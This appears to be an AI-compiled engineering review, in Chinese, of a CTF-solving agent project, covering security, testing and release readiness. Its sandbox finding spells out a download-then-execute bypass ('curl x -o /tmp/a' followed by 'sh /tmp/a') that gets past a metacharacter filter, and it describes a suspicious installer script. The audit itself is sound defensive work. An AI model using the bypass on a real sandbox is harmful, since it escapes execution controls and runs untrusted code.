# 极致锐评 · 西湖论剑 CTF-Agent

**日期**：2026-08-21
**场景**：全维度工程锐评（产品战略 / 安全审计 / QA与发布 / 代码质量 / 设计体验）
**参与视角**：产品官 + 安全官 + 质量门神 + 排障手 + 设计师
**执行说明**：团队创建工具（TeamCreate）在本环境不可用，按主理人降级策略，由主理人沽思航**直接以五视角独立取证汇编**（非代写成员，证据均来自实地读取工程源码）。

---

## 📌 TL;DR（执行摘要）

- **整体结论**：🟡 **有条件 Go**（技术可跑，但演示可信度与参赛资格均悬于单点）
- **阻塞项数量**：3 个 🔴（供应链投毒嫌疑 / 白名单非 fail-closed 致 DQ 风险 / Mock 假解无声）
- **最刺眼一句话**：团队用"100% 解出率"的 mock 靶机给自己灌了迷魂汤，而真正的供应链炸弹（`setup.sh`）就躺在仓库根目录、还没入库。
- **下一步**：赛前 4 小时，按下方 P0 行动清单逐条销账，否则"演示翻车 + 资格取消"双杀。

---

## 🎯 核心结论卡片

| 项目 | 内容 |
|------|------|
| Go / No-Go | 🟡 条件 Go（须先销 3 个 🔴） |
| 严重度分布 | 🔴 3 / 🟠 4 / 🟡 3 / 🟢 2 |
| 关键行动项 | 7 条（P0×3 / P1×3 / P2×1） |
| 建议负责人 | 用户（赛前处置）+ 主理人（代码加固） |
| 一句话 verdict | "能跑，但别信它自己和它那块看板" |

---

## 1. 各视角核心结论

### 🔍 产品官（产品战略）
- **核心判断**：战略方向（1主1监、解出率优先、步骤级修正、分级降级）是对的，但**执行被"自我麻痹"反噬**——规划文档 `todo.md` 几乎所有阶段打 `[x]`，而 5.1/5.2 官方 API 对接、阶段6 演练、阶段7 初赛等**核心验收仍为空 `[ ]`**，形成"规划已完成"的幻觉。
- **关键建议**：把"已砍多模型竞速"这句从文档删掉或恢复并测试——`run.py:280-333` 竞速逻辑**根本没砍**（见排障手）。创新点必须用一道**真实赛题**的解出率支撑，而非 mock 靶机的 100%。

### 🛡️ 安全官（OWASP+STRIDE）
- **核心判断**：**最危险的问题不在代码里，在仓库根目录**——`E:\Program\西湖论剑\setup.sh` 是一个从 `https://releases.fx.sh/...` 下载未知二进制 `fx` 并 `chmod +x` 装入 `~/.local/bin` 的安装器，与项目**零关系、未入库、全仓唯一引用**。这是供应链投毒级别的信号，必须按安全事件处置。
- **关键建议**：白名单保护（`llm/client.py:135`）是 **opt-in** 而非 fail-closed；`run.py` 自身不设置 `CTF_AGENT_ENFORCE_WHITELIST`，一旦比赛 shell 没继承该变量，agent 可能调用明文标注"初赛禁用"的 `openai/grok/tokenrouter` → **直接取消资格**。沙盒 bash 路径的元字符过滤（`subprocess_executor.py:285`）可被跨调用拆分绕过。

### ✅ 质量门神（QA与发布）
- **核心判断**：测试通过率**失真且自指**——`scripts/_batch_solve_unified.py` 内嵌 Mock 靶机 + 22 道硬编码攻击，解的是自己造的题，所谓"100% 解出率"是纯粹的虚荣指标。"7/7 绿、45/45 绿"多为 mock，真实 LLM 下的解出率**零证据**。
- **关键建议**：用真实赛题建立最小解出率基线；83 个 `scripts/`（68 未清）+ 10 份 `exploit_shop_v*.py` 迭代稿反映发布纪律缺失；3 小时连续作战的最大单点故障是 **限流熔断 + DeepSeek 额度 + 白名单失效三连**。

### 🔧 排障手（代码质量/就绪）
- **核心判断**：P0 修复（监督死锁 `main_agent.py:270-285`、配置陷阱、RSA fallback）**确实落地且正确**，沙盒 `sanitized_env()` 剥密钥（A3）也做得对——但**文档与代码严重脱节**：v2.0 明说"砍多模型竞速"，`run.py` 却仍保留竞速并用了与白名单端点不一致的模型名（`deepseek-v4-flash` vs `deepseek-chat`），打 `api.deepseek.com` 必 400。`config.py:77` 导入即副作用改写 `os.environ`，难测难查。
- **关键建议**：开赛前 4 小时最该查的 3 个雷：①根 `setup.sh` 是否被执行过；②`ENFORCE_WHITELIST=1` 在当前比赛 shell 是否真生效；③竞速模型名是否 400。

### 🎨 设计师（看板/演示）
- **核心判断**：单页看板（`web/static/index.html`）完成度**及格偏上**——深色 GitHub 风、状态徽标、人工干预注入 UI、2s 轮询，作为开发面板够用；但作为**评委演示件**有明显短板：不显示"当前是否真实 LLM / Mock"、无模型升级时间线、无 attempt/重试可视化、失败原因只显 `human_reason`。
- **关键建议**：初赛前看板最该补的 1 件事——**加一个醒目的"真实 LLM / Mock"状态徽标 + 当前 provider·model 显示**，否则演示时可能无声展示 100% 假解，自欺欺评委。

---

## 2. 综合审查发现（去重合并，按严重度）

| # | 严重度 | 类别 | 位置 | 问题描述 | 建议 | 来源 |
|---|--------|------|------|---------|------|------|
| 1 | 🔴 | 供应链/安全 | `E:\Program\西湖论剑\setup.sh`（根，未入库） | 从 `releases.fx.sh` 下载未知二进制 `fx` 并 `chmod +x` 装到 `~/.local/bin`，与项目无关、来历不明 | 立即隔离+溯源，赛前必处置；确认是否曾被执行为第一步 | 安全官 |
| 2 | 🔴 | 合规/可用性 | `llm/client.py:135` + `run.py`（不设该变量） | 白名单阻断仅在 `CTF_AGENT_ENFORCE_WHITELIST=1` 生效，且 run.py 不自行设置；误用禁用 provider 直接 DQ | 在 run.py 启动入口 `os.environ.setdefault("CTF_AGENT_ENFORCE_WHITELIST","1")` 改 fail-closed | 安全官/产品 |
| 3 | 🔴 | 可信度/演示 | `run.py:635 --mock`、`config.py:91 use_real_llm=False`、`web/static/index.html` | fail-open 默认走 Mock，看板无"真实 LLM/Mock"指示，演示可能无声展示假解 | 看板加真实 LLM 状态徽标；赛前确认非 mock 模式 | 产品/设计 |
| 4 | 🟠 | 安全/沙盒 | `sandbox/subprocess_executor.py:274-288` `_check_bash_command` | bash 路径仅屏蔽 `; && || \|`，不拦危险命令本身；可跨多次调用 `curl x -o /tmp/a` + `sh /tmp/a` 绕过；AST 校验只覆盖 `python:` 前缀 | 对 bash 命令复用 AST 校验或显式命令白名单（openssl/xxd/binwalk），禁止任意下载执行 | 安全官 |
| 5 | 🟠 | 范围/一致性 | `run.py:280-333` | "多模型竞速"死灰复燃，与 v2.0"已砍"决策矛盾；竞速默认模型 `deepseek-v4-flash`/`qwen3.8-27b` 与白名单端点模型（`deepseek-chat`/`deepseek-reasoner`）不一致，打 `api.deepseek.com` 必 400 | 统一模型名；要么真砍要么恢复并测通 | 产品/排障 |
| 6 | 🟠 | 测试/可信度 | `scripts/_batch_solve_unified.py` | 内嵌 Mock 靶机 + 22 道硬编码攻击，解自己题得 100%；"45/45 绿"多为 mock，真实解出率无证据 | 用真实赛题建最小解出率基线，替代自嗨指标 | QA |
| 7 | 🟠 | 工程卫生 | `ctf_agent/` 根 + `scripts/` | 83 个 scripts（68 未清）、10 份 `exploit_shop_v*.py`、根游离 `java_ser.py`/`make_phar.py`/`extracted.png`/`test_phar.gif`/`quick_*.txt`、`scripts/` 内 `*.jar`/`*.java` 反序列化研究件 | 清理临时脚本，研究件归位/隔离，建立 solutions 唯一归档 | 排障/QA |
| 8 | 🟡 | 代码异味 | `config.py:58-77` | 模块 import 即副作用：读 HKCU\Environment 写 os.environ，魔法式、难测试 | 改为显式 init()，移除导入副作用 | 排障 |
| 9 | 🟡 | 演示叙事 | `web/static/index.html` | 无模型升级时间线、无 attempt/重试可视化、失败原因仅 human_reason | 增加 attempt 进度条与失败原因列 | 设计 |
| 10 | 🟡 | 成本/延迟 | `core/main_agent.py:270-285` | 每步 stuck 都调 `_supervise`（额外 LLM 调用），高并发下成本上升；prescan 命中后首步即 break，逻辑分叉多 | 加 supervise 调用节流；梳理 break 分支 | 排障 |
| 11 | 🟢 | 肯定项 | `sandbox/subprocess_executor.py` | `sanitized_env()` 剥密钥（A3 缓解）、AST 白/黑名单、watchdog 重复/idle 检测——沙盒设计有真实思考 | 保留，作为后续 docker 版基线 | 安全官 |
| 12 | 🟢 | 肯定项 | `core/main_agent.py:183-210,230-242` | 确定性预扫 + 墙钟硬止损（300s）思路正确，防幻觉与拖死并发池 | 保留 | 产品 |

---

## ✅ 行动清单（赛前销账用）

| # | 行动 | 负责方 | 紧急度 | 期望完成 |
|---|------|--------|--------|---------|
| 1 | 隔离根目录 `setup.sh`（fx 安装器），溯源是否本人操作、是否被执过；赛前删除或确认无害 | 用户 | P0 | 今天开赛前 |
| 2 | `run.py` 启动入口硬置 `CTF_AGENT_ENFORCE_WHITELIST=1`（fail-closed），杜绝误用禁用 provider 致 DQ | 用户/主理人 | P0 | 今天开赛前 |
| 3 | 看板加"真实 LLM / Mock"状态徽标 + 当前 provider·model；赛前确认非 mock | 设计/主理人 | P0 | 今天开赛前 |
| 4 | 沙盒 bash 路径改为命令白名单或复用 AST 校验，禁任意下载执行 | 安全/主理人 | P1 | 决赛前 |
| 5 | 统一模型名（config vs run.py 竞速），删或真恢复"多模型竞速"并测通 | 产品/排障 | P1 | 决赛前 |
| 6 | 用≥1 道真实赛题建立最小解出率基线，替代 mock 100% 自嗨 | QA | P1 | 初赛后/决赛前 |
| 7 | 清理根游离文件 + 83 临时 scripts，研究件归位，solutions 唯一归档 | 排障 | P2 | 决赛前 |

---

## ⚠️ 待完善 / 已知局限

- 本锐评基于**静态取证**（读取源码/配置/游离文件），未实际启动跑分，故"真实解出率"仍未知——这本身就是第 6 条行动要解决的盲区。
- 团队调度工具（TeamCreate/Agent）在本环境被门控，五视角由主理人直调完成，非独立成员背书，结论归主理人负责。
- 根 `setup.sh` 的性质（误放 vs 投毒）需用户确认——本评按"先假定危险"处理。

---

## 📚 取证索引（主理人直调）

- 供应链异常：`E:\Program\西湖论剑\setup.sh`（根，未入库）
- 密钥/白名单：`ctf_agent/config.py`、`ctf_agent/llm/client.py`
- 沙盒执行：`ctf_agent/sandbox/executor.py`、`ctf_agent/sandbox/subprocess_executor.py`
- 主循环/监督修复：`ctf_agent/core/main_agent.py`
- 看板：`ctf_agent/web/static/index.html`、`ctf_agent/web/server.py`、`ctf_agent/run.py`
- mock 自嗨：`ctf_agent/scripts/_batch_solve_unified.py`
- 工程卫生：`ctf_agent/scripts/`（83）、`ctf_agent/solutions/`（exploit_shop_v*×10）、`ctf_agent/*.py`/`*.png`/`*.gif` 根游离文件

---

> 本报告由软件工坊主理人沽思航直调汇编（团队工具不可用，降级执行）。关键决策请由工程负责人复核。锐评的目的不是泼冷水，是防止你们带着自己的幻觉上场。
